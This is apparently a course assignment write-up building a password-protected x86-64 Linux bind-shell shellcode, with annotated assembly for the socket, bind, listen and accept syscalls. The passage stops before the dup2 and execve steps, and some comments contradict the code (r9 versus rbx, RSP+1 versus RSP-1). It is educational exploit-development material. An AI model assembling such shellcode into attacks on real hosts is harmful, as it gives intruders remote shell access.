## Assignment #1
## Bind_Shell_TCP

### Introduction
---

Requirements for this assignment are to create a Shell_Bind_TCP shellcode that: 

  1. Listens on a specific port 
  2. Requires a password 
  3. If the password is correct, then Exec Shell is executed 
  4. Also, the NULL bytes (0x00) must be removed from the shellcode 

To build the shellcode, we is required the use of the linux sockets and do the following steps: 

  1. Create a socket 
  2. Bind the socket to a port 
  3. Start listenning for connections 
  4. Accept incoming connections 
  5. Ask, read, and validate the password 
  6. Duplicate `SDTIN`, `STDOUT` and `STDERR` to the socket descriptor 
  7. Execute /bin/sh for the incoming and validated conection 

In case the password is not correct, the shellcode will exit with a Segmentation Fault. The shellcode won’t care on how the program terminates. This makes sense as shellcode will be smaller in size and really does not matter how it exits. 

For Linux Sockets Programming, the following System calls are required on this assignment: 

```c
int socket(int domain, int type, int protocol); 
int bind(int sockfd, const struct sockaddr *addr, 
         socklen_t addrlen); 
int listen(int sockfd, int backlog); 
int accept(int sockfd, struct sockaddr *addr, 
           socklen_t *addrlen); 
int close(int sockfd); 
```
To duplicate the standard input, output and error, `dup2()` call will be used: 

```c
int dup2(int oldfd, int newfd); 
```

And to execute `/bin/sh`, will use the `execve()` call: 

```c
int execve(const char *filename, 
           char *const argv[], 
           char *const envp[]); 
```
### ASM Implementation
----

Will explain how we implement each step mentioned before into ASM, with the idea to make the code easy to understand. No enphasys has been put into removing NULLs and make the shellcode small (this is done later).

#### Create a Socket

```asm
; sock = socket(AF_INET, SOCK_STREAM, 0) 
mov rax, 41                 ; syscall number 
mov rdi, AF_INET            ; IPv4 
mov rsi, SOCK_STREAM        ; TCP connection 
mov rdx, 0                  ; IP Protocol 
syscall 
; Save the socket_id value in RDI for future use 
mov rdi, rax                ; value returned in RAX by syscall  
```
This is the first step required for sockets, open the socket. 
To execute the sys_socket system call the arguments will have to be placed in the corresponding registers: 

  - RAX <- 41 : Syscall number. 
  - RDI <- 2 : Domain parameter. AF_INET is for IPv4. 
  - RSI <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
  - RDX <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 

The syscall will return a file descriptor in RAX that is saved into RDI. This saves the socket_id for later use in the code

#### Bind the Created Socket to a Port

```asm
; Prepare (struct sockaddr *)&server 
;       RSP will point to the struct address 
xor rax, rax 
push rax                    ; bzero(&server.sin_zero, 8) 

mov dword [rsp - 4], INADDR_ANY 
mov word [rsp - 6], PORT 
mov word [rsp - 8], AF_INET 
sub rsp, 8                  ; Update RSP with right value 

; bind(sock, (struct sockaddr *)&server, sockaddr_len) 
;       RDI already has the sock_id 
mov rax, 49                 ; syscall number 
mov rsi, rsp                ; @ to (struct sockaddr * &server) 
mov rdx, 16                 ; length of the sockaddr struct 
syscall  
```
This part irequires two steps:

  - Create the `struct sockaddr` structure. Stack is used to store the values of the struct:
    - Values are placed on the stack
    - Stack Pointer (RSP) is updated with the new address
  - Call the `bind` syscall. Values for parameters are placed into the registers:
    - RAX: Syscall number (49)
    - RDI: Socket descriptor. Already has the value from previous point
    - RSI: Address of the struct. This value is in RSP
    - RDX: The lengh of the sockaddr struct. It's 16 bytes

#### Listen for Incoming Connections

```asm
; listen(sock, MAX_CLIENTS 
;       RDI already has the sock_id 
mov rax, 50          ; syscall number 
mov rsi, 2			     
syscall 
```
Values in the registers for the `listen` call parameters are:
  - RAX <- 50 : Syscall Number 
  - RDI : Already stores the socket descriptor 
  - RSI <- 2 : Is the backlog parameter 

#### Accept Incoming Connections

```asm
; client_sock = accept(sock_id, 
;                     (struct sockaddr *)&client, 
;                      &sockaddr_len) 
;       RDI already has the sock_id 

mov rax, 43                 ; syscall number 

; Reserve space on the stack for the struct (16 bytes) 
sub rsp, 16                 ; Reserved 16 bytes 
mov rsi, rsp                ; RSI <- @ sockaddr struct 
 
; Store in the Stack the sockaddr_len value 
mov byte [rsp - 1], 16      ; Stored the len (16 bytes) 

sub rsp, 1                  ; Update value for RSP 
mov rdx, rsp                ; RDX <- @sockaddr_len 
syscall 

; Store the client socket descripion returned by accept 
mov rbx, rax                 ; r9 <- client_sock 
```
`accept()`requires the following parameters:

- Socket descriptor, that's already stored in RDI
- Address of the struct by reference. Stack is used to store this struct reserving 16 bytes in stack. The data of this struct will be modified by the syscall and will access throught RSP register
- Address where the length of the struct is stored. This value is stored in the stack. RSP has this value

Registers get this following values for the parametrers:
- RAX <- 43 : Syscall Number 
- RDI : Already stores the socket descriptor 
- RSI <- RSP : Address of stack where struct is 
- RDX <- RSP+1 : Address of stack where the length of the struct is. Just one position more tan the struct itself 

This call returns a socket descriptor for the client, that is stored in R9 for future use.

#### Close the Parent socket Descriptor
